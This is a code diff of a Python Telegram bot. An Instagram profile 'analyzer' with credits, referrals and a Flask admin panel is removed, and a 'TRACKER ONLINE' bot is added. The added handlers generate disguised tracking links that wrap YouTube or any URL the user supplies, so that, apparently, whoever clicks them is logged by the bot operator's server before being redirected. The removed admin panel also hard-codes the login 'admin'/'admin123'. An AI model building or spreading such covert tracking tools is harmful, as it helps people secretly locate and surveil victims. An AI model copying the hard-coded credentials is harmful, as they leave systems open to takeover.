-    user_id = profile.get("id", "N/A")
-    bio = profile.get("biography", "") or "No bio"
-    followers = f"{profile.get('followers', 0):,}"
-    following = f"{profile.get('following', 0):,}"
-    posts = profile.get("posts", 0)
-    private = "✅ YES" if profile.get("is_private", False) else "❌ NO"
-    verified = "✅ YES" if profile.get("is_verified", False) else "❌ NO"
-    business = "✅ YES" if profile.get("is_business_account", False) else "❌ NO"
-    professional = "✅ YES" if profile.get("is_professional_account", False) else "❌ NO"
-    external_url = profile.get("external_url", "None")
-    
-    report = f"""
-╔══════════════════════════════════════╗
-║     🔥 INSTAGRAM ANALYZER PRO 🔥     ║
-║           BY @proxyfxc               ║
-╚══════════════════════════════════════╝
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📱 INSTAGRAM INFORMATION
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-• USERNAME: @{username}
-• FULL NAME: {full_name}
-• USER ID: {user_id}
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📝 BIO:
-{bio}
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📊 STATISTICS:
-• 👥 FOLLOWERS: {followers}
-• 🔄 FOLLOWING: {following}
-• 📸 POSTS: {posts}
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🔒 PRIVATE: {private}
-✅ VERIFIED: {verified}
-💼 BUSINESS: {business}
-🎯 PROFESSIONAL: {professional}
-🔗 EXTERNAL URL: {external_url if external_url else 'None'}
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🚨 DETECTED ISSUES"""
-    
-    for issue in issues:
-        report += f"\n• {issue}"
-    
-    if risk >= 80:
-        risk_emoji = "🔴 HIGH RISK"
-    elif risk >= 50:
-        risk_emoji = "🟡 MEDIUM RISK"
-    else:
-        risk_emoji = "🟢 LOW RISK"
-    
-    report += f"""
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-⚠️ RISK ASSESSMENT
-• SCORE: {risk}% {risk_emoji}
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-⏱️ COLLECTED: {collected_at}
-💻 DEVELOPER: {developer}
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
-    
-    return report
-
-# ================= HANDLERS =================
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    uid = update.effective_user.id
-    username = update.effective_user.username
+    user_id = update.effective_user.id
     
-    # Check for referral
-    referrer_id = None
-    if context.args and context.args[0].startswith("ref_"):
-        try:
-            referrer_id = int(context.args[0].split("_")[1])
-        except:
-            pass
-    
-    save_user(uid, username, referrer_id)
-
-    if not await is_joined(context.bot, uid):
+    if not await is_subscribed(context.application, user_id):
+        buttons = []
+        for channel in CHANNELS:
+            buttons.append([InlineKeyboardButton(f"Join Channel", url=channel)])
+        
+        # Add verification button
+        buttons.append([InlineKeyboardButton("✅ Verified (Start Again)", url=f"https://t.me/{(await context.bot.get_me()).username}?start")])
+        
         await update.message.reply_text(
-            "❌ Please join all channels first.",
-            reply_markup=join_kb()
+            "❌ **Access Denied!**\n\nBot use karne ke liye aapko hamare teenon channels join karne honge.\n\n**Channels:**\n" + 
+            "\n".join([f"• {ch}" for ch in CHANNELS]),
+            reply_markup=InlineKeyboardMarkup(buttons)
         )
         return
-
-    credits = get_credits(uid)
     
     await update.message.reply_text(
-        f"✨ Welcome to Insta Analyzer Pro ✨\n\n"
-        f"📊 Your Status: {'✅ PREMIUM' if credits > 100 else '❌ FREE'}\n"
-        f"💰 Credits: {credits}\n\n"
-        f"Send any Instagram username to analyze!",
-        reply_markup=menu_kb()
+        "𝗧𝗥𝗔𝗖𝗞𝗘𝗥 𝗢𝗡𝗟𝗜𝗡𝗘\n\nᴄᴏᴘʏ ᴛʜɪs ᴀɴᴅ ᴘᴀsᴛᴇ👉 (https://youtube.com).\n\n✅ 𝗬𝗢𝗨𝗥 𝗧𝗥𝗔𝗖𝗞𝗜𝗡𝗚 𝗟𝗜𝗡𝗞👇\n"
+        f"`{SERVER_URL}/?id={user_id}&redir=https%3A//youtube.com`\n\n⚡ Powered by @proxyfxc",
+        parse_mode="Markdown"
     )
 
-async def callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    q = update.callback_query
-    await q.answer()
-    uid = q.from_user.id
-
-    if q.data == "check":
-        if await is_joined(context.bot, uid):
-            credits = get_credits(uid)
-            await q.message.edit_text(f"✅ Access granted!\n\n💰 Credits: {credits}", reply_markup=menu_kb())
-        else:
-            await q.message.reply_text("❌ Please join all channels first", reply_markup=join_kb())
-
-    elif q.data == "menu":
-        credits = get_credits(uid)
-        await q.message.edit_text(f"🏠 Main Menu\n\n💰 Credits: {credits}", reply_markup=menu_kb())
-
-    elif q.data == "credits":
-        credits = get_credits(uid)
-        cur.execute("SELECT total_referrals FROM users WHERE id = ?", (uid,))
-        referrals = cur.fetchone()[0] if cur.fetchone() else 0
-        
-        text = f"💰 YOUR CREDITS: {credits}\n"
-        text += f"👥 TOTAL REFERRALS: {referrals}\n\n"
-        text += f"🔰 Get more credits:\n"
-        text += f"• Refer friends: +{REFERRAL_CREDITS} credits each\n"
-        text += f"• Contact admin to buy credits"
-        
-        await q.message.edit_text(text, reply_markup=menu_kb())
-
-    elif q.data == "referral":
-        link = get_referral_link(uid)
-        text = f"🔗 YOUR REFERRAL LINK:\n\n{link}\n\n"
-        text += f"💰 You get {REFERRAL_CREDITS} credits for each friend who joins!"
-        await q.message.edit_text(text, reply_markup=menu_kb())
-
-    elif q.data == "deep":
-        credits = get_credits(uid)
-        if credits <= 0:
-            await q.message.reply_text(
-                "❌ You have 0 credits!\n\n"
-                "Get more credits by:\n"
-                "• Referring friends (+3 credits each)\n"
-                "• Contact admin to buy credits",
-                reply_markup=menu_kb()
-            )
-            return
-            
-        context.user_data["wait"] = True
-        await q.message.reply_text("👤 Send Instagram username (with or without @):")
-
-    elif q.data.startswith("report|"):
-        username = q.data.split("|")[1]
-        
-        if not deduct_credit(uid):
-            await q.message.reply_text("❌ Insufficient credits!", reply_markup=menu_kb())
-            return
-        
-        await q.message.reply_text("🔄 Fetching full report...")
-        increment_reports()
-        
-        data = fetch_profile(username)
-        if not data:
-            add_credits(uid, 1)  # Refund
-            await q.message.reply_text("❌ Profile not found or API error")
-            return
-        
-        risk, issues = calc_risk(data)
-        report = format_report(data, risk, issues)
-        credits_left = get_credits(uid)
-        report += f"\n💰 Credits left: {credits_left}"
-        
-        await q.message.reply_text(report, reply_markup=after_kb(username))
-
-    elif q.data == "help":
-        await q.message.reply_text(
-            "🔍 *How to use:*\n"
-            "• Send any Instagram username\n"
-            "• Get detailed analysis\n"
-            "• Risk assessment included\n\n"
-            "💰 *Credit System:*\n"
-            "• Each analysis costs 1 credit\n"
-            "• Get 3 credits per referral\n\n"
-            "📊 *Commands:*\n"
-            "• /start - Main menu\n"
-            "• /credits - Check credits\n"
-            "• /referral - Get referral link\n\n"
-            "👑 *Admin:*\n"
-            "• /users - Total users\n"
-            "• /stats - Bot stats\n"
-            "• /addcredits [user_id] [amount] - Add credits\n"
-            "• /broadcast - Send message",
-            parse_mode='Markdown'
-        )
-
-async def handle_username(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not context.user_data.get("wait"):
-        return
-
-    context.user_data["wait"] = False
-    uid = update.effective_user.id
-    username = update.message.text.replace("@", "").strip()
-    
-    if not username:
-        await update.message.reply_text("❌ Please send a valid username")
+async def handle_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if not await is_subscribed(context.application, user_id):
+        await start(update, context)
         return
     
-    credits = get_credits(uid)
-    if credits <= 0:
-        await update.message.reply_text(
-            "❌ You have 0 credits!\n\n"
-            "Get more credits by:\n"
-            "• Referring friends (+3 credits each)\n"
-            "• Contact admin to buy credits",
-            reply_markup=menu_kb()
-        )
+    url = update.message.text
+    if not url.startswith("http"):
+        await update.message.reply_text("❌ Link `http` ya `https` se shuru hona chahiye.")
         return
     
-    status_msg = await update.message.reply_text("🔄 Analyzing Instagram profile...")
-    increment_searches()
+    uid = update.effective_chat.id
+    redir = urllib.parse.quote(url)
+    link = f"{SERVER_URL}/?id={uid}&redir={redir}"
     
-    if not deduct_credit(uid):
-        await status_msg.edit_text("❌ Credit deduction failed")
-        return
-    
-    data = fetch_profile(username)
-    
-    if not data:
-        add_credits(uid, 1)  # Refund
-        await status_msg.edit_text("❌ Profile not found or API error")
-        return
-    
-    risk, issues = calc_risk(data)
-    profile = data.get("profile", {})
-    pic_url = profile.get("profile_pic_url_hd")
-    
-    credits_left = get_credits(uid)
-    caption = f"🎯 ANALYSIS COMPLETE\n@{username}\nRisk: {risk}%\n💰 Credits left: {credits_left}"
-    
-    if pic_url:
-        try:
-            pic_data = download_image(pic_url)
-            if pic_data:
-                await update.message.reply_photo(
-                    photo=pic_data,
-                    caption=caption,
-                    reply_markup=after_kb(username)
-                )
-                await status_msg.delete()
-                return
-        except Exception as e:
-            print(f"Photo error: {e}")
-    
-    await status_msg.edit_text(caption, reply_markup=after_kb(username))
+    await update.message.reply_text(
+        f"✅ 𝗬𝗢𝗨𝗥 𝗧𝗥𝗔𝗖𝗞𝗜𝗡𝗚 𝗟𝗜𝗡𝗞👇\n`{link}`\n\n⚡ Powered by @proxyfxc",
+        parse_mode="Markdown"
+    )
 
-# ================= ADMIN COMMANDS =================
-async def users_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id != ADMIN_ID:
-        await update.message.reply_text("❌ Unauthorized")
-        return
-    await update.message.reply_text(f"👥 Total users: {total_users()}")
-
-async def stats_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id != ADMIN_ID:
-        await update.message.reply_text("❌ Unauthorized")
-        return
-    
-    searches, reports = get_stats()
-    total = total_users()
-    await update.message.reply_text(f"📊 STATS:\n👥 Users: {total}\n🔍 Searches: {searches}\n📄 Reports: {reports}")
-
-async def addcredits_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id != ADMIN_ID:
-        await update.message.reply_text("❌ Unauthorized")
-        return
-    
-    if len(context.args) < 2:
-        await update.message.reply_text("Usage: /addcredits [user_id] [amount]")
-        return
-    
-    try:
-        user_id = int(context.args[0])
-        amount = int(context.args[1])
-        add_credits(user_id, amount)
-        await update.message.reply_text(f"✅ Added {amount} credits to user {user_id}")
-        
-        try:
-            await context.bot.send_message(user_id, f"💰 You received {amount} credits from admin!")
-        except:
-            pass
-    except:
-        await update.message.reply_text("❌ Invalid input")
-
-async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id != ADMIN_ID:
-        await update.message.reply_text("❌ Unauthorized")
-        return
-
-    if not context.args:
-        await update.message.reply_text("Usage: /broadcast message")
-        return
-
-    msg = " ".join(context.args)
-    cur.execute("SELECT id FROM users")
-    sent = 0
-    failed = 0
-
-    for (uid,) in cur.fetchall():
-        try:
-            await context.bot.send_message(uid, msg)
-            sent += 1
-        except:
-            failed += 1
-
-    await update.message.reply_text(f"✅ Broadcast sent to {sent} users\n❌ Failed: {failed}")
-
-# ================= FLASK ROUTES =================
-@app.route('/')
-def home():
-    return "Bot is running! Admin panel at /admin"
-
-@app.route('/admin')
-def admin_login():
-    return '''
-    <html>
-        <body style="background:#1a1a1a;color:#fff;font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh;">
-            <div style="background:#2d2d2d;padding:30px;border-radius:10px;">
-                <h2>Admin Login</h2>
-                <form method="post" action="/admin/auth">
-                    <input type="text" name="username" placeholder="Username" style="width:100%;padding:10px;margin:10px 0;" required>
-                    <input type="password" name="password" placeholder="Password" style="width:100%;padding:10px;margin:10px 0;" required>
-                    <button type="submit" style="background:#00a86b;color:#fff;padding:10px;width:100%;border:none;border-radius:5px;">Login</button>
-                </form>
-            </div>
-        </body>
-    </html>
-    '''
-
-@app.route('/admin/auth', methods=['POST'])
-def admin_auth():
-    if request.form['username'] == 'admin' and request.form['password'] == 'admin123':
-        session['admin'] = True
-        return redirect(url_for('admin_dashboard'))
-    return "Invalid credentials"
-
-@app.route('/admin/dashboard')
-def admin_dashboard():
-    if not session.get('admin'):
-        return redirect(url_for('admin_login'))
-    
-    searches, reports = get_stats()
-    total = total_users()
-    
-    users = cur.execute("SELECT id, username, credits, total_referrals FROM users ORDER BY joined_date DESC LIMIT 20").fetchall()
-    
-    html = f'''
-    <html>
-        <head>
-            <title>Admin Dashboard</title>
-            <style>
-                body {{background:#1a1a1a;color:#fff;font-family:Arial;padding:20px;}}
-                .stats {{display:grid;grid-template-columns:repeat(3,1fr);gap:20px;margin-bottom:30px;}}
-                .stat-card {{background:#2d2d2d;padding:20px;border-radius:10px;text-align:center;}}
-                table {{width:100%;background:#2d2d2d;border-radius:10px;overflow:hidden;}}
-                th,td {{padding:12px;text-align:left;border-bottom:1px solid #3d3d3d;}}
-                th {{background:#00a86b;}}
-            </style>
-        </head>
-        <body>
-            <h1>Admin Dashboard</h1>
-            <div class="stats">
-                <div class="stat-card"><h3>Total Users</h3><p>{total}</p></div>
-                <div class="stat-card"><h3>Searches</h3><p>{searches}</p></div>
-                <div class="stat-card"><h3>Reports</h3><p>{reports}</p></div>
-            </div>
-            <h2>Recent Users</h2>
-            <table>
-                <tr><th>ID</th><th>Username</th><th>Credits</th><th>Referrals</th></tr>
-    '''
-    for uid, uname, credits, refs in users:
-        html += f'<tr><td>{uid}</td><td>@{uname or "N/A"}</td><td>{credits}</td><td>{refs}</td></tr>'
-    
-    html += '''
-            </table>
-            <p><a href="/admin/logout" style="color:#fff;">Logout</a></p>
-        </body>
-    </html>
-    '''
-    return html
-
-@app.route('/admin/logout')
-def admin_logout():
-    session.pop('admin', None)
-    return redirect(url_for('admin_login'))
-
-# ================= RUN =================
 def run_flask():
-    app.run(host='0.0.0.0', port=PORT)
+    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
 
-def main():
-    # Start Flask in thread
-    flask_thread = threading.Thread(target=run_flask, daemon=True)
-    flask_thread.start()
-    
-    # Start bot
-    app = Application.builder().token(BOT_TOKEN).build()
-
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("users", users_cmd))
-    app.add_handler(CommandHandler("stats", stats_cmd))
-    app.add_handler(CommandHandler("addcredits", addcredits_cmd))
-    app.add_handler(CommandHandler("broadcast", broadcast))
-    app.add_handler(CallbackQueryHandler(callbacks))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_username))
-
-    print("✅ Bot started!")
-    print(f"👑 Admin ID: {ADMIN_ID}")
-    print(f"📊 Force channels: {FORCE_CHANNELS}")
-    print(f"💰 Referral credits: {REFERRAL_CREDITS}")
-    print(f"🌐 Admin panel: http://localhost:{PORT}/admin")
-    app.run_polling()
-
-if __name__ == "__main__":
-    main()
+if __name__ == '__main__':
+    threading.Thread(target=run_flask).start()
+    bot = Application.builder().token(TOKEN).build()
+    bot.add_handler(CommandHandler("start", start))
+    bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_link))
+    bot.run_polling()
